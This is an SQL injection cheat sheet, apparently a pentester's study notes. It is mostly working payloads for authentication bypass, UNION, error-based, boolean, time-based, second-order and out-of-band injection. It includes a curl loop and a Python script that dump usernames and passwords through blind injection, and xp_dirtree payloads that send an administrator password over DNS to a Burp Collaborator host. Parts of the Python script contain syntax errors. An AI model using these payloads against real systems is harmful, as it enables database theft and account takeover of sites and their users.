# SQL injection (SQLi)

## Resources

| [https://resources.infosecinstitute.com/topic/dumping-a-database-using-sql-injection/](https://resources.infosecinstitute.com/topic/dumping-a-database-using-sql-injection/)                                                                                                                                                       |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [https://github.com/JohnHammond/miscellaneous/blob/master/SQL\_INJECTION\_CHEATSHEET.md](https://github.com/JohnHammond/miscellaneous/blob/master/SQL_INJECTION_CHEATSHEET.md)                                                                                                                                                     |
| [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/05-Testing\_for\_SQL\_Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection) |
| [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution)                                                                       |
| [https://github.com/Y000o/sql\_injection\_basic/blob/master/sql\_injection\_basic\_en.md](https://github.com/Y000o/sql_injection_basic/blob/master/sql_injection_basic_en.md)                                                                                                                                                      |
| [https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)                                                                                                                                                                                               |
| [https://cheatography.com/binca/cheat-sheets/sql-injection/](https://cheatography.com/binca/cheat-sheets/sql-injection/)                                                                                                                                                                                                           |
| [https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)                                                                                                                                                         |
| [https://www.acunetix.com/websitesecurity/sql-injection2/](https://www.acunetix.com/websitesecurity/sql-injection2/)                                                                                                                                                                                                               |
| [https://www.programmersought.com/article/466012852/](https://www.programmersought.com/article/466012852/)                                                                                                                                                                                                                         |
| [https://resources.infosecinstitute.com/topic/sql-injection-http-headers/](https://resources.infosecinstitute.com/topic/sql-injection-http-headers/)                                                                                                                                                                               |
| [https://github.com/siddicky/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md](https://github.com/siddicky/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)                                                                                                                                               |
| [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)                                                                                                                                                                                                   |

_SQL injection (SQLi)_ is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. In many cases, an attacker can modify or delete this data, or even compromise the underlying server or other back-end infrastructure, DoS as well. Even read files, write files, RCE...

{% hint style="info" %}
Always try other databases like Oracle and MSSQL, not only MySQL.

Try it on every param.
{% endhint %}

## How to detect  SQLi+ WAFs

{% tabs %}
{% tab title="Basic" %}
<pre class="language-c" data-full-width="true"><code class="lang-c">We generally begin our attack by inputting a single quote into 
every field that we suspect might passits parameter to the database.
<strong>
</strong>'
"
' OR 1=1#
' OR 1=2 -- -
Careful with OR 1=1 in UPDATE, DELETE statements, it could case accidental loss of data
<strong>1' -- -
</strong>1 -- -
-1 -- -
1;--
'
' or 1=1;#
' or 1=1 LIMIT 1;#
admin' or 1=1 LIMIT 1;#
?id='' union select 1,2,username,password,5 from users--
union all select...

# Invent the first parameter, for example if only id=1, try id=567 union select...

</code></pre>
{% endtab %}

{% tab title="Auth Bypass" %}
```sql
' OR 1=1 -- // 
' OR 1=1; -- - 
admin'
' or 1=1 in (select @@version) -- // 
' OR 1=1 in (SELECT * FROM users) -- // 
' OR 1=1 in (SELECT password FROM users) -- // 
' OR 1=1 in (SELECT password FROM users where user = "admin") -- // 
```
{% endtab %}

{% tab title="Database" %}
{% code overflow="wrap" %}
```bash
/*! comment here */ --    # for MySQL
WAITFORDELAY              # MSSQL
UTL_INADDR......          # Oracle (search the whole command)/*! comment here */ --    // for MySQL
```
{% endcode %}
{% endtab %}

{% tab title="WAF" %}
| [https://github.com/EnableSecurity/wafw00f](https://github.com/EnableSecurity/wafw00f)                                                        |
| --------------------------------------------------------------------------------------------------------------------------------------------- |
| [https://owasp.org/www-community/attacks/SQL\_Injection\_Bypassing\_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF) |
| [https://github.com/stamparm/identYwaf](https://github.com/stamparm/identYwaf)                                                                |
{% endtab %}

{% tab title="Resources" %}
{% embed url="https://suip.biz/?act=sqlmap" %}

{% embed url="https://github.com/stamparm/DSSS" %}
{% endtab %}
{% endtabs %}

{% hint style="info" %}
* If a field has more space to be displayed with SQLi and UNION for example, it is a logical spot for our future exploit's output.
* If anything of this is unclear, connect to a local database and practice/play around with these queries.
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```sql
# SQL injection in different parts of the query
Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query, but also:
    In UPDATE statements, within the updated values or the WHERE clause.
    In INSERT statements, within the inserted values.
    In SELECT statements, within the table or column name.
    In SELECT statements, within the ORDER BY clause.

# Subverting application logic
administrator'--

select system_user();
mysql -u root -p'root' -h 192.168.50.16 -P 3306
SELECT user, authentication_string FROM mysql.user WHERE user = 'admin';

#  ends with a semicolon followed by GO on aseparate line. However, when running the command remotely, GO can be omitted.
sqlcmd> SELECT @@version; GO
impacket-mssqlclient Administrator:Password123@$IP -windows-auth
SELECT @@version;
SELECT name FROM sys.databases; # master, tempdb, model, and msdb are default databases

# Show info on table format (pretty):
select * from users \G
```
{% endcode %}

## Steps

{% hint style="info" %}
* UNION ALL gives duplicate results so might be interesting to remove "ALL" word if possible
* **concat**, **group\_concat** or if they do not work, extract info field by field (first user then pass)
* If there are a lot of tables > **LIMIT** 0,1 > Make a Bash script (one-liner) w/ curl to iterate LIMIT X,1 so we get all tables separatedly

{% code overflow="wrap" %}
```sh
└─$ curl -s -X POST http://IP/login --data "email=test@test.com' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=\"main\" -- -&password=asdlfj"

for i in $(seq 0 100); do echo -n "Table $i "  && curl -s -X POST http://$IP/login --data "email=test@test.com' union select 1,2,3,table_name from information_schema.tables LIMIT $i,1 -- -&password=asdlfj"
```
{% endcode %}
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```bash
# CONSIDER ALL DB TYPES SUCH AS SQLITE), dbms=sqlite---------------------------------

# SMALL THINGS YOU WANT TO RETRIEVE:
https://portswigger.net/web-security/sql-injection/cheat-sheet
database() user() @@version @@datadir 
             
echo "table" | xxd -ps # IF TABLE_NAME IS NOT ACCEPTED --> TRY IN HEX  
# then remove "0a" at the end (is a point that is added by default)

# ISSUES WITH TOO MUCH DATA
LIMIT 1,1

# DUMP THE DATABASE
curl -s URL | html2text # html2text because curl gets HTML

# HASHES.COM (CRACKING WEBSITE LIKE CRACKSTATION)
```
{% endcode %}

## SQLi types

{% hint style="info" %}
As parameter, it's important to try cod=1 or cod=**-1**, specially in cases where the query does not display info that is supposed to. The - is to avoid displaying the 1st query.

Both boolean and time-based could be blind.
{% endhint %}

### Basic

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads
https://portswigger.net/support/sql-injection-bypassing-common-filters

# FIRST, IF POSSIBLE TRY ALL THIS LIST WITH HYDRA/WFUZZ/INTRUDER IN ONE OR BOTH FIELDS
https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads

SELECT * FROM users WHERE username = 'admin' AND PASSWORD = 'admin'
SELECT * FROM users WHERE username = 'admin'--
SELECT * FROM users WHERE username = 'admin';
SELECT * FROM users WHERE username = 'bob'/**/SELECT/**/UNION/**/*/**/FROM/**/users/**/LIMIT/**/1;
SELECT * FROM users WHERE username = 'adm'||'in';

'
"
-- -
' or 1=1--
' or 1=1-- -
1 or 1=1-- -
' or 1=1 -- -;
' or 1=1 --
' OR 1=1 #
1' or '1'='1'-- -
SAME WITH " 
'--
"--
') -- -
admin'--
admin';
user' -- -

# URL/POST INJECTION USING BURP (TO BYPASS CLIENT-SIDE JAVASCRIPT VALIDATION)

# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email=
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='

# FIX ERRORS (ERROR-BASED OR BLIND)
1' --+ # + is the encoded result of the space
```
{% endcode %}

### UNION

{% code overflow="wrap" fullWidth="true" %}
```bash
UNION SQLi attack consists of 3 stages:
1. You need to determine the number of columns you can retrieve.
2. You make sure that the columns you found are in a suitable format
3. Attack and get some interesting data.


# SQL injection UNION attacks
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
# We need to know: 
- number of columns of the original query
- which of those have suitable data type for our injected query
# Determine number of columns 
' ORDER BY 1--
' ORDER BY 2--# SQL injection UNION attacks
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
# We need to know: 
- number of columns of the original query
- which of those have suitable data type for our injected query
# Determine number of columns 
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
=1 UNION ALL SELECT
1 UNION SELECT
0 union select null,null,null
-1 union select null,null,null
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT NULL#
' UNION SELECT NULL//
' UNION SELECT NULL/*
etc.
​

############### Bypassing filters (UNION without commas because , are badchars)
(SELECT * FROM (SELECT 1) AS A JOIN (SELECT 2) AS B JOIN (SELECT 3) AS C)
# NOTE: Try %20 as well as + for URL encoding, maybe one of them it works and the other does not

# DETECT BADCHARS
- Copy the request to a file
- Add FUZZ -> GET /user/ippsec'--%20-FUZZ/
ffuf -request user.req -request-proto http -w special-chars.txt'
# The result 200 status code are good characters and the rest are considered badchars

# Join works as the comma for the union injection and the 3 selects means the query return 3 columns 
' UNION (SELECT * FROM (SELECT 1) AS A JOIN (SELECT 2) AS B JOIN (SELECT 3) AS C)


'####### Database-specific syntax
' UNION SELECT NULL FROM DUAL-- 
https://portswigger.net/web-security/sql-injection/cheat-sheet
'
# Finding columns with a useful data type
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
​

# Using a SQL injection UNION attack to retrieve interesting data
' UNION SELECT username, password FROM users--
'


# ORACLE
' UNION SELECT username || '~' || password FROM users--  
https://portswigger.net/web-security/sql-injection/cheat-sheet
'
# Retrieve the list of tables in the Oracle database:
'+UNION+SELECT+table_name,NULL+FROM+all_tables--                                                                         '
# Oracle payload to retrieve the details of the columns in the table.
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXX'--
'

# Examining the database in SQL injection attacks
    Syntax for string concatenation.
    Comments.
    Batched (or stacked) queries.
    Platform-specific APIs.
    Error messages.
Database type 	Query
Microsoft, MySQL 	SELECT @@version
Oracle 	SELECT * FROM v$version
PostgreSQL 	SELECT version() 
​

# Listing the contents of the database
SELECT * FROM information_schema.tables
SELECT schema_name FROM information_schema.schemata
SELECT table_name from information_schema.tables where table_schema='mydatabase'
SELECT column_name from information_schema.columns where table_schema='mydatabase' and table_name='mytable'
SELECT user,pass from mydatabase.mytable
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
​
​
'UNION SELECT NULL,GROUP_CONCAT(USER,':',PASS)
'UNION SELECT NULL,GROUP_CONCAT(USER,'0x3a',PASS)
group_concat(username,':',password SEPARATOR '<br>')
CONCAT(USER,':',PASS)
USER||':'||PASS
# If some strings are not allowed, use hex to encode them
echo admin | tr -d '\n' | xxd ps
WHERE USER="0x..."
USE DB.TABLE (SUCH AS MYSQL.USERS) IN CASE OTHER DB IS CURRENTLY IN USE
' ORDER BY 3--
etc.
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
=1 UNION ALL SELECT
1 UNION SELECT
0 union select null,null,null
-1 union select null,null,null
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT NULL#
' UNION SELECT NULL//
' UNION SELECT NULL/*
etc.

# Database-specific syntax
' UNION SELECT NULL FROM DUAL-- 
https://portswigger.net/web-security/sql-injection/cheat-sheet
'
# Finding columns with a useful data type
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

# Using a SQL injection UNION attack to retrieve interesting data
' UNION SELECT username, password FROM users--
'
# Retrieving multiple values within a single column
# Oracle
' UNION SELECT username || '~' || password FROM users--  
https://portswigger.net/web-security/sql-injection/cheat-sheet
'
# Examining the database in SQL injection attacks
    Syntax for string concatenation.
    Comments.
    Batched (or stacked) queries.
    Platform-specific APIs.
    Error messages.
Database type 	Query
Microsoft, MySQL 	SELECT @@version
Oracle 	SELECT * FROM v$version
PostgreSQL 	SELECT version() 

# Listing the contents of the database
SELECT * FROM information_schema.tables
SELECT schema_name FROM information_schema.schemata
SELECT table_name from information_schema.tables where table_schema='mydatabase'
SELECT column_name from information_schema.columns where table_schema='mydatabase' and table_name='mytable'
SELECT user,pass from mydatabase.mytable
SELECT * FROM information_schema.columns WHERE table_name = 'Users'


'UNION SELECT NULL,GROUP_CONCAT(USER,':',PASS)
'UNION SELECT NULL,GROUP_CONCAT(USER,'0x3a',PASS)
group_concat(username,':',password SEPARATOR '<br>')
CONCAT(USER,':',PASS)
USER||':'||PASS
# If some strings are not allowed, use hex to encode them
echo admin | tr -d '\n' | xxd ps
WHERE USER="0x..."
USE DB.TABLE (SUCH AS MYSQL.USERS) IN CASE OTHER DB IS CURRENTLY IN USE
```
{% endcode %}

### Error

{% code overflow="wrap" fullWidth="true" %}
```bash
https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/#mysql-error-based
https://securityidiots.com/Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html

# Error-based SQL injection
Use error messages to either extract or infer sensitive data from the database, even in blind contexts
You can modify the query so that it causes a database error only if the condition is true or false
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
If the error causes a difference in the app HTTP response, use this to determine if the injected condition is true.
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
# Extracting sensitive data via verbose SQL error messages
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char'
# Induce the app to generate an error message that contains some of the data that is returned by the query
# You can use the CAST() function to achieve this. It enables you to convert one data type to another.
CAST((SELECT example_column FROM example_table) AS int)
ERROR: invalid input syntax for type integer: "Example data"'
# Using CAST function to convert data types so it triggers an error
TrackingId=x'||CAST((SELECT username FROM users LIMIT 1) AS int)--;
TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;

' or 1=1 -- //
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users) -- //
SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))
-1 order by 3 -- -
-1 and 1=1 order by 4 -- -
' order by 100-- -
'ORDER BY 200-- - # to detect error asking for lots of columns


# EXTRACTVALUE
testing,EXTRACTVALUE(1535,CONCAT(0x5c,0x717a626271,(SELECT (ELT(1535=1535,1))),0x717a6b7671))
testing;SELECT EXTRACTVALUE(1,CONCAT(0x5c,(select user()),0x5c))#
admin' AND EXTRACTVALUE(1,concat(0x0a,(select SCHEMA_NAME from information_schema.schemata)))--
admin' AND EXTRACTVALUE(1,concat(0x0a,(select SCHEMA_NAME from information_schema.schemata limit 1)))--
admin' AND EXTRACTVALUE(1,concat(0x0a,(select SCHEMA_NAME from information_schema.schemata limit 0,1)))--
admin' AND EXTRACTVALUE(1,concat(0x0a,(select SCHEMA_NAME from information_schema.schemata limit 1,1)))--
# In case we have a char limitation that bothers us while retrieving hashes for example
admin' AND EXTRACTVALUE(1,concat(0x0a,(select SUBSTR(password,1,20) from users limit 1,1)))-- -
admin' AND EXTRACTVALUE(1,concat(0x0a,(select SUBSTR(password,21,40) from users limit 1,1)))-- -
```
{% endcode %}

### Boolean - bypass badchars

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash"># PRACTICE / PLAY WITH ALL OF THIS USING MARIADB/MYSQL IF WE NEED TROUBLESHOOTING
# Comparison Operators (try all in case some are badchars / blacklisted) -> at first we find out = is a badchar
https://dev.mysql.com/doc/refman/8.4/en/comparison-operators.html
ipp' or 1=1 -- -
ipp' or 1 like 1 -- -
ipp' or 1 like 2 -- -
ipp' or (select 1) like 1 -- -
# If following fails, it might mean _ is a badchar
' or (select schema_name from information_schema.schemata limit 1) like 1 -- -                                '
# Enumerate users column
' or (select 1 from table limit 1) like 1-- -                                                                  '
# We can fuzz "table" until we find it is users
' or (select 1 from users limit 1) like 1-- -																	'
# Once we guess the table name, we start guessing the column name by fuzzing or guessing
' or (select username from users limit 1) like 1-- -																	'
# Now we can start exfiltrating data
' or (select username from users limit 1,1) like 'ippsec'-- -																'
# If we find an error it means , is a badchar
https://dev.mysql.com/doc/refman/8.4/en/select.html
# limit 2,1 is the same as limit 1 offset 2 -> if result is 0 or valid, it means 1st register (1st column, 1st row) is ippsec
' or (select username from users limit 1 offset 0) like 'ippsec'-- - 												'
# Now since ippsec is an example and we really do not know what is the value, we need substring to iterate
https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_substr
' or (select substring(username,1,1) from users limit 1 offset 0) like 'i'-- -														'
# If above fails it is because we know , is a badchar
' or (select substring(username from 1 for 1) from users limit 1 offset 0) like 'i'-- -
' or (select substring(username from 2 for 1) from users limit 1 offset 0) like 'p'-- -
# To simplify the fact of using individual chars for comparisons, we convert them to decimal base
' or (select ord(substring(username from 2 for 1)) from users limit 1 offset 0) like 112-- - 								'
# Now we want to say &#x3C; 112 or > 112 but &#x3C;> are badchars
https://dev.mysql.com/doc/refman/8.4/en/comparison-operators.html#operator_between
' or (select ord(substring(username from 2 for 1)) from users limit 1 offset 0) between 0 and 113-- -
' or (select ord(substring(username from 2 for 1)) from users limit 1 offset 0) between 113 and 200-- 
# Find length of the register until we find the real length
' or (select length(username) from users limit 1 offset 0) like 1-- -
' or (select length(username) from users limit 1 offset 0) like 6-- -


# SCRIPT TO AUTOMATE ALL 
import requests

url = 'http://localhost:5000/forgot/'

# Get number of rows in column / matched and unmatched is to make sure our request works and we can diff boolean response
def rowCount(table, max=64):
	# Is our boolean logic good?
	payload = f"a' or (select count(1) from {table}) not like 0-- -/"
	matched = requests.get(url+payload)
	payload = f"a' or (select count(1) from {table}) like 0-- -/"
	unmatched = requests.get(url+payload)
	if matched.text == unmatched.text:
		raise Exception(f"Cannot identify number of columns in {table} Matched({matched.text}) Unmatched({unmatched.text})")
		
	for i in range(0,max):
		# Guess the total numbers
		payload = f"a' or (select count(1) from {table}) like {i}-- -/"
		r = requests.get(url+payload)
		if r.text != unmatched.text:
			return i
			
	raise Exception(f"Cannot identify number of columns in {table})")

# Get Length of the current row
def columnLength(table, column, line, max=64):
	# Is our boolean logic good?
	payload = f"a' or select length({column}) from {table} LIMIT 1 OFFSET {line}) not like 0-- -/"
	matched = requests.get(url+payload)
	payload = f"a' or select length({column}) from {table} LIMIT 1 OFFSET {line}) like 0-- -/"
	unmatched = requests.get(url+payload)
	if matched.text == unmatched.text:
		raise Exception(f"Cannot get Column Length")
		
	for guess in range(0,max):
		# Guess the length of column
		payload = f"a' or select length({column}) from {table} LIMIT 1 OFFSET {line}) like {guess}-- -/"
		r = requests.get(url+payload)
		if r.text != unmatched.text:
			return guess
	raise Exception(f"Cannot identify number of columns in {table})")


# Get the data
def columnData(table, column, offset, line):
	# Test if our logic is good for guessing a character. substr(var from 0 for 0) always returns null
	payload = f"a' or (select substring({column}) from 0 for 0) from {table} LIMIT 1 OFFSET {line}) not like 0-- -/"
	matched = requests.get(url+payload)
	payload = f"a' or (select substring({column}) from 0 for 0) from {table} LIMIT 1 OFFSET {line}) like 0-- -/"
	unmatched = requests.get(url+payload)
	if matched.text == unmatched.text:
		raise Exception(f"Cannot perform substring")

	# Weird algorithm to speed things up
	start = 32
	end = 126
	while start != (end - 1): # guess algorithm: if we have 1 2 3 4 5 6 we first guess if it's 1-3 or 4-6 and then keep
		halfway = int((end - start)/2)
		guess = start + halfway
		payload = f"a' or (select ord(substring({column}) from {offset} for 1)) from {table} LIMIT 1 OFFSET {line}) between {start} and {guess}-- -/"
		r = requests.get(url+payload)
		print(f"BETWEEN chr({start}) and chr({end})")
		if r.text == matched.text:
			end = guess
		else:
			start = guess
	payload = f"a' or (select ord(substring({column}) from {offset} for 1)) from {table} LIMIT 1 OFFSET {line}) like {start}-- -/"	
	r = requests.get(url+payload)
	if r.text == matched.text:
		return chr(start)
		
	payload = f"a' or (select ord(substring({column}) from {offset} for 1)) from {table} LIMIT 1 OFFSET {line}) like {end}-- -/"	
	r = requests.get(url+payload)
	if r.text == matched.text:
		return chr(end)
	
	raise Exception(f"Unable to get character at offset ({offset}) on line {line}")
	
if __name__ == "__main__":
	try: 
		# Get the total number of rows to dump
		columnCount = rowCount("users")
		# To retrieve passwords, replace "username" by "password" or whatever the pwd field is named
		for row in range(0, rowCount):
			# Get the length of the current row
			length = columnLength("users", "username", row)
			# Loop over each character in the row
	  		for offset in range(1, length+1):
	  			print(columnData("users","username", offset, row), end='', flush=True)
	  		print()
	except Exception as e:
		print(e)


# It might be blind, see differences and write a script if so
' or 1=1 -- -
' or 2=1 -- -
' or 'a'='a' -- -
' or (select 'a')='a' -- -
# If above works, we send the following payload to Intruder and try to find the first database char which would mean our payload works
' or (select substring(database(),1,1))='a' -- - 

' or (select substring(username, 1, 1) from users limit 1)='a' -- -
<strong>
</strong><strong># Then write a script if necessary
</strong><strong>
</strong>test%' AND 3673=3673 AND 'fIaw%'='fIaw
<strong>
</strong><strong>1' and true -- -
</strong>1' and false -- -
1' AND 1=1 --+
1' AND 1=0 --+
admin' AND 1=1 -- //
" AND 1=1
# Parentheses
0) AND (1=1
0) AND (1=0

" or (select substr(group_concat(password),1,1) from code)='m'-- -
# In case it case insensitive
" or (select ascii(substr(group_concat(password),1,1)) from code)=109-- -
# BRUTEFORCE TABLE IF WE DO NOT KNOW IT (FUZZ W/ DIRECTORY MEDIUM BY REPLACING "TABLE")
" or select 1 from table-- - 
</code></pre>

### Blind

{% code overflow="wrap" fullWidth="true" %}
```bash
# Blind SQL injection
When it is vulnerable to SQLi, but its HTTP responses do not contain SQL query or any database errors.
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
#  When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user: 
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
# Conditional responses
…xyz' AND '1'='1
…xyz' AND '1'='2
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
#  We can continue this process to systematically determine the full password for the Administrator user. 
# NOTE: The SUBSTRING function is called SUBSTR on some types of database


' AND '1'='1
' AND '1'='2
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a


# Boolean-based
SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--
admin' AND (length(database())) = 8 --
admin' AND (ascii(substr((select database()),2,1))) = 113 --
TIP: Pay attention to something on the website that shows/dissapear depending on if the query is true/false
' AND 1=1 -- //
' AND 2=1 -- -
?user=admin' AND IF (1=1, sleep(2),'false') -- //
' UNION SELECT 1,2,3 where database() like '%';--
' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sql_database' and table_name like 'a%';--
' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema = 'sql_database' and table_name='users' and column_name like 'a%';--
' and '1'='1
' and (select 'a' from users limit 1)='a
' and (select 'a' from users limit 1)='a
' and (select substring(username,1,1) from users where username='administrator')='a
' and (select substring(username,2,1) from users where username='administrator')='d
' and (select substring(password,1,1) from users where username='administrator')='a
If it seems to work > Burp > Intruder > Sniper to see if the first char is guessed and then work on a Python scripts
# Guess length of a field
' and (select 'a' from users where username='administrator' and length(password)>5)='a
# Once we know the length for the script, we can stop it when it finds that length for the data we want to retrieve


# Conditional error (it shows a different status code depending on if the query is true/false
'||(select '' from dual)||'
'||(select case when (1=1) then to_char (1/0) else '' end from users where username='admin')||' # it throws an error in case it's true
'||(select case when (1=1) then to_char (1/0) else '' end from users where username='admin' and length(password)>=10)||'
# Oracle - fuzz first char, try on Burp first to go ahead later w/ Python script
'||(select case when substr(password,1,1)='a' then to_char (1/0) else '' end from users where username='admin')||'


# Time-based (nothing changes the web content, we just have the response time)
# Blind SQL injection by triggering time delays
# Microsoft SQL Server - first should not trigger a delay, second should and third is to retrieve data
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
'; IF (1=1) WAITFOR DELAY '0:0:10'--
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
' 
# TRY OR as well as AND
SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--
admin' AND IF (1=1, sleep(3),'false') -- //
' and sleep(5)-- -
' and (select sleep(5) from flag where (substr(database(),1,1)='s)); -- -
AND PASSWORD LIKE '%%' AND 1=1 --
select ... from ... where ... and sleep(5);
                              and if(substr(database(),1,1)='a',sleep(5),1);
' and (select sleep(5) from flag where (substr(database(),1,1)='s)); -- -
'
''
1' UNION SELECT SLEEP(5),2 where database() like 'u%';--
admin' and if(substr(database(),1,1)='a',sleep(5),1);-- -
' OR (SELECT (IF ((SELECT @@version), 20, 'what' )) )#
' OR (SELECT (IF ((SELECT 1 from x), 20, 'what' )) )#

# POSTGRES 
'||pg_sleep(10)-- -
;SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--
; SELECT pg_sleep(7)--
# in case table users and username admin is true
'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) from users where username='admin')-- - 
# Fuzz the following on on Burp with Sniper and Resource Pool > max requests 1 > delay btw requests 500 ms to check it works
'||(select case when substring(password,1,1)='a' then pg_sleep(5) else pg_sleep(0) from users where username='admin')--
```
{% endcode %}

### 2nd-order

Unlike traditional SQL Injection, which exploits real-time processing vulnerabilities, it occurs when data previously stored in a database is later used in a SQL query.

Second-order SQL injection, also known as stored SQL injection, exploits vulnerabilities where user-supplied input is saved and subsequently used in a different part of the application, possibly after some initial processing. The injection occurs upon the second use of the data when it is retrieved and used in a SQL command, hence the name "Second Order".

For example, register an account and then login or inserting a new product

```
12345'; UPDATE books SET book_name = 'Hacked'; --
```

and then updating it via another function.

If there is a register panel as well as the login panel. Inject in the register and use the same data in the login. For example

{% code overflow="wrap" fullWidth="true" %}
```sql
# Second-order SQL injection / Stored SQL injection
Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use.
Register -> badguy'; update set password='letmein' where user='administrator'-- - and then we log in as administrator
'

' or 1=1-- - 
# for both fields to register and then same for login.

# Create an admin account when it is already created
admin'-- -
# Then change its password to access that account
```
{% endcode %}

### Newline

{% code overflow="wrap" fullWidth="true" %}
```bash
field%0a=value # useful in case code is filtering out the modification of a certain field called "field"
field/**/=value
```
{% endcode %}

### Out-of-band (OOB)

Out-of-band (OOB) SQL injection is an attack technique that pentester/red teamers use to exfiltrate data or execute malicious actions when direct or traditional methods are ineffective. Unlike In-band SQL injection, where the attacker relies on the same channel for attack and data retrieval, Out-of-band SQL injection utilises separate channels for sending the payload and receiving the response. Out-of-band techniques leverage features like **HTTP** requests, **DNS** queries, **SMB** protocol, or other network protocols that the database server might have access to, enabling attackers to circumvent firewalls, intrusion detection systems, and other security measures.

{% code overflow="wrap" fullWidth="true" %}
```sql
# Blind SQL injection using out-of-band (OAST)
If vulnerable to SQLi but other techniques did not work, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control.
A variety of network protocols can be used for this purpose, but typically the most effective is DNS. Many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems. 
# Using Burp Collaborator
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--                              '
#  This causes the database to perform a lookup for the following domain:
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
# Having confirmed OAST, use it to exfiltrate data from the vulnerable application
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
'
'
# An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
